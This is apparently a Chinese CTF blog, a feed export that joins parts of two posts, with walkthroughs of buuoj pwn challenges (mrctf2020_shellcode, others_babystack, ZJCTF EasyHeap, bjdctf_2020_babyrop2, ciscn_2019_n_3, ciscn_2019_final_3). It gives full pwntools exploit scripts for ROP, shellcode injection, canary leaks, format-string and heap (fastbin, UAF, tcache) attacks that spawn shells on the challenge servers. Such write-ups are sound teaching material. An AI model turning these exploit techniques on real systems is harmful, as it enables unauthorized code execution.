<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>read=elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>int_80=<span class="hljs-number">0x080493e1</span><br>sh=<span class="hljs-number">0x080c1a9d</span><br>bss=<span class="hljs-number">0x080eaf80</span><br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>pop_eax=<span class="hljs-number">0x080bae06</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(read)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>payload+=p32(pop_eax)+p32(<span class="hljs-number">0xB</span>)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(int_80)<br><br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二个方法其实本质原理与上一个一样，就是跳转read的构造方式不一样，这边直接使用地址跳转，而不是系统调用。注意这两个方法的int 80不一样，用第二的int 80调用两次就会出现上图的情况</p>
<p>exp3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level =<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>bss=<span class="hljs-number">0x080eaf80</span><br>mprotect=elf.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read=elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(mprotect)+p32(ppp_ret)+p32(<span class="hljs-number">0x80ea000</span>)+p32(<span class="hljs-number">0x2000</span>)+p32(<span class="hljs-number">0x7</span>)<br>payload+=p32(read)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x50</span>)+p32(bss)<br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(asm(shellcraft.sh()))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第三个方法是使用mprotect把.bss修改为可执行，然后注入shellcode来getshell，有个点是修改的起始位置，得要最后三个为0才行，否则打不通，像是内存对齐的问题。</p>
<h3 id="三十七、mrctf2020-shellcode"><a href="#三十七、mrctf2020-shellcode" class="headerlink" title="三十七、mrctf2020_shellcode"></a>三十七、mrctf2020_shellcode</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210522191716.png"></p>
<p>checksec一下，预测是注入shellcode，然后拖进IDA。</p>
<img src="/2021/05/09/2021-05-09-buu05/QQ图片20210522191817.png" style="zoom:80%;">

<p>这题出没办法反汇编，百度上的wp也没办法，可能是直接call rax有点问题。不过好在汇编不复杂，很简单的程序逻辑，先输入0x400，然后做一个判断，其实这个判断无影响的，有输入的话，rax返回值就是大于0，跳转到右侧去执行，右侧是直接执行我们输入的数据，所以这边是直接ret2shellcode</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27104</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;magic!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十八、others-babystack"><a href="#三十八、others-babystack" class="headerlink" title="三十八、others_babystack"></a>三十八、others_babystack</h3><p>这题代码很简单，canary也很容易泄露，其他就是rop。所以不多说。</p>
<p>注意点就是，这里的退栈要执行功能3才能退出，我刚开始一直反应过来，后面才发现的。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27939</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=<span class="hljs-number">0x400908</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x400a93</span><br><span class="hljs-comment">#泄漏canary</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x88</span>)<br>canary=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;canary: &quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>puts=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base=puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十九、-ZJCTF-2019-EasyHeap"><a href="#三十九、-ZJCTF-2019-EasyHeap" class="headerlink" title="三十九、[ZJCTF 2019]EasyHeap"></a>三十九、[ZJCTF 2019]EasyHeap</h3><p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525230925.png"></p>
<p>checksec一下， 然后进入ida。根据题目已经知道是个heap题目。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231121.png"></p>
<p>这边在编辑chunk上内容时候，输入的大小是再次由我们确定的，所以这里有着堆溢出漏洞，可以修改后一个chunk的fd指针，导致任意写的目的。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231025.png"></p>
<p>这边释放已经把指针置空了。</p>
<p>生成chunk就没什么好说的，然后这里是没有打印函数的，如果要输出就比较麻烦，要用IO结构体输出了。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210525231313.png"></p>
<p>这边其实有个后门函数的，可能是原题的有，但是这是buu，做到这大家应该都知道，flag就是直接在/根目录下的，所以不用去尝试就知道这里不行，但是给了system函数，got又可以改写，这边就使用修改got表的方法。具体脚本写，exp的注释十分详细了，步骤也不复杂，就不赘述了。</p>
<p>具体脚本编写，我在百度里面找到了一个师傅写的很详细，就直接搬过来了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26437</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=<span class="hljs-number">0x400700</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br>	pause()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;heap:&quot;</span>,p64(<span class="hljs-number">0</span>))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_got)<br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>delete(<span class="hljs-number">2</span>)<br>payload = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x6020e0</span>-<span class="hljs-number">0x40</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>debug()<br><span class="hljs-comment"># 修改 heap1 内容为 &#x27;/bin/sh\x00&#x27;, 以及堆溢出 heap2(freed) 修改其 fd 指针 </span><br><span class="hljs-comment"># 因为最后释放的是 heap1,利用 &#x27;__free_hook&#x27;(system) Getshell </span><br><span class="hljs-comment"># 为什么是 0x6020e0-0x40+0xd，这个偏移就是去寻找7f的固定手法，只是改变-后面的去找符合条件的就是了</span><br><span class="hljs-comment"># FakeChunk 若以这里为 prev_size，则 size 正好是一个 0x000000000000007f</span><br><span class="hljs-comment"># 可以绕过 malloc_chunk 的合法性验证 (new_chunk 的 size 位要与 bin 链表 size 一致)</span><br><span class="hljs-comment"># 这样就伪造出了一个 chunk</span><br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(free_got)<br>edit(<span class="hljs-number">3</span>,payload)<br><span class="hljs-comment"># 修改 heap3 (Fake)</span><br><span class="hljs-comment"># 作用是把 heaparray[0] 的地址 (原先记录的是 chunk0的地址) 覆写成 free_got 地址</span><br><span class="hljs-comment"># 这就是要在 heaparry 附近构造 Fakeheap 的原因</span><br><span class="hljs-comment"># 确定具体的偏移量需要动态调试 </span><br>edit(<span class="hljs-number">0</span>,p64(system))<br><span class="hljs-comment"># free_got 地址的作用在这里体现了</span><br><span class="hljs-comment"># 由于 edit() 的目标是 heaparry[] 里面的地址</span><br><span class="hljs-comment"># 那么本次操作将修改 free_got 为 system_plt 的地址</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 当释放 chunk1 (内容为 &#x27;/bin/sh\0x00&#x27;) 的时候</span><br><span class="hljs-comment"># 把 chunk1 当参数传入 free() 中执行，由于 free() 地址已经被修改成 system()</span><br><span class="hljs-comment"># 最后程序执行的就是 system(chunk1&#x27;s content) 即 system(&#x27;/bin/sh\0x00&#x27;), 成功 Getshell</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二个我自己写的没能打通，看报错像是检验大小没过，可是我之前做过一道题，这样子也是可以创建堆块的，我是想把chunk直接创建在free的got.plt里面，直接改就好了，没必要像上面绕一圈子，没想过不行。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210527152159.png"></p>
<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,28313)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>free_got=<span class="hljs-number">0x602018</span><br>system=<span class="hljs-number">0x400700</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br>	pause()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;heap:&quot;</span>,p64(<span class="hljs-number">0</span>))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>delete(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(free_got-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>debug()<br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">3</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(system))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十、bjdctf-2020-babyrop2"><a href="#四十、bjdctf-2020-babyrop2" class="headerlink" title="四十、bjdctf_2020_babyrop2"></a>四十、bjdctf_2020_babyrop2</h3><p>checksec一下</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100246.png"></p>
<p>开启了NX和Canary</p>
<p>进入ida看看代码</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100325.png"></p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529100334.png"></p>
<p>一个函数里面有着格式化字符串漏洞，允许我们输入六个长度的数据，用来泄露canary的，然后在后面的函数里面存在栈溢出，泄露libc的以及getshell的。</p>
<p><img src="/2021/05/09/2021-05-09-buu05/QQ%E5%9B%BE%E7%89%8720210529092432.png"></p>
<p>AAAAAA是我输进去的内容，他的位置在栈顶处，是格式化字符串的第六个参数，可以看见，在其下面的就是我们要的canary了，所以是第七个参数，从而确定构造为”%7$p”，之后就是正常的普通rop内容了。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27477</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x400993</span><br>main=<span class="hljs-number">0x400887</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;%7$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;u!&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(canary)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">&#x27;deadbeef&#x27;</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">&quot;story!&quot;</span>,payload)<br>p.recv()<br>read=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(read)<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">&#x27;deadbeef&#x27;</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;story!&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu04</title>
    <url>/2021/05/05/2021-05-05-buu04/</url>
    <content><![CDATA[<p>以下几题的ciscn是我先抽出来做的，因为这几周在进行iscc，以及不久就是ciscn，所以看看之前的题目，就先不按顺序</p>
<h3 id="十七、ciscn-2019-n-3"><a href="#十七、ciscn-2019-n-3" class="headerlink" title="十七、ciscn_2019_n_3"></a>十七、ciscn_2019_n_3</h3><p>照例checksec一下</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505110425-1620522753562.png"></p>
<p>开启了nx和canary，relro只开启部分，可以修改got表（后面没用到就是了）</p>
<p>进入ida看看反汇编代码</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505110633-1620522770994.png"></p>
<p>总共有着四个功能，第一个new note：</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505110745.png"></p>
<p>在第一个功能里面，可以创建一个堆，堆里面第一个存放的是printf函数指针，第二存放了一个free函数指针，第三个存放有区别，当type==1，存放的是一个数据，type ==2，存放的是字符串的地址。然后这个字符串的真正位置存放在又生成的一个堆里面。</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505111350.png"></p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505111403.png"></p>
<p>free函数里面并未将指针置空，存在uaf漏洞。</p>
<p>另外三个功能，一个是调用printf函数指针，打印出一串字符串，一个是调用free函数指针，还有一个就是打印没什么意义的字符串</p>
<p>在函数表里面，我们可以看见，system函数被调用过了，也就是接下来就是/bin/sh以及调用的问题，这里我们选择在函数指针做手脚，因为函数指针未置空，我们只需要把free函数指针改为指向system的地址，然后再对释放的内容修改为/bin/sh的地址，就能让调用free(ptr)变成system(“/bin/sh”)，这边由于输入长度问题，写的是/sh字符串。</p>
<p>那该怎么修改呢？利用fastbin attack，首先创建两个chunk（type==2的，chunk0和chunk1）创建的chunk都是固定大小为0xc的chunk，后面我们能控制大小的chunk随便写一个大小即可（不能为0xc！其他都行）。然后释放掉这两个chunk，再申请一个chunk3，我们能控制大小的chunk也要设置大小也为0xc，由于LIFO，那么程序创建的chunk将会被分配到第二个被释放的chunk1的位置，我们能控制大小的chunk就会被分配到第一个释放的chunk0的位置，而我们又能对这个chunk进行输入，所以把”sh\x00\x00”+p32(system)输入即可，最后再释放掉调用函数</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505112805.png"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,27753)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">idx,num,size,value</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Type &gt;&quot;</span>,<span class="hljs-built_in">str</span>(num))<br>	<span class="hljs-keyword">if</span> num==<span class="hljs-number">1</span> :<br>		p.sendlineafter(<span class="hljs-string">&quot;Value &gt;&quot;</span>,value)<br>	<span class="hljs-keyword">else</span> :<br>		p.sendlineafter(<span class="hljs-string">&quot;Length &gt;&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>		p.sendlineafter(<span class="hljs-string">&quot;Value &gt;&quot;</span>,value)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index &gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">purchase</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;CNote &gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x14</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x14</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-string">&quot;sh\x00\x00&quot;</span>+p32(system))<br>gdb.attach(p,<span class="hljs-string">&#x27;b*main&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)   <span class="hljs-comment">#uaf</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="十八、ciscn-2019-final-3"><a href="#十八、ciscn-2019-final-3" class="headerlink" title="十八、ciscn_2019_final_3"></a>十八、ciscn_2019_final_3</h3><p>常规checksec一下</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505113309.png"></p>
<p>保护全开了，拖进ida看看反汇编代码吧</p>
<img src="/2021/05/05/2021-05-05-buu04/QQ图片20210505202136.png">

<p>c++代码写的，不过功能很简单，就两个选择，先看第一个吧</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505202251.png"></p>
<p>最多可以创建二十四个不同的索引，堆的大小最大不能超过0x78，被限制只有fast chunk大小，然后我们在创建之后还能往堆上输入数据，最后，printf了堆的地址出来。</p>
<p>第二个功能更简单</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505202536.png"></p>
<p>释放掉索引对应的堆块，并且可以发现，并未将堆指针置空，存在uaf漏洞。在找找其他地方，发现没有存在后门函数。那只能走泄露libc了，然后劫持hook函数。</p>
<p>要泄露libc，就要有被释放的unsorted bin，这里限制了chunk的大小，那我们就要去修改chunk size，将其修改为比0x410大的数，因为题目环境为libc-2.27.so，存在tcache。</p>
<p>先创建许多堆块（后面再解释为什么创建这么多个），然后释放同一个堆块，因为存在tcache，所以可以直接释放两次</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505203105.png"></p>
<p>出现了循环指向，这时候我们在申请同样大小的堆块，这里是要申请三次，第三次chunk生成的地方（选择生成在chunk0的size处，修改他的值），才是我们要的。首先是指向自身，当我们第一次申请时，通过输入把fd修改为指向chunk0</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210505203355.png"></p>
<p>这是第一次申请，可以看到，chunk0地址出现了</p>
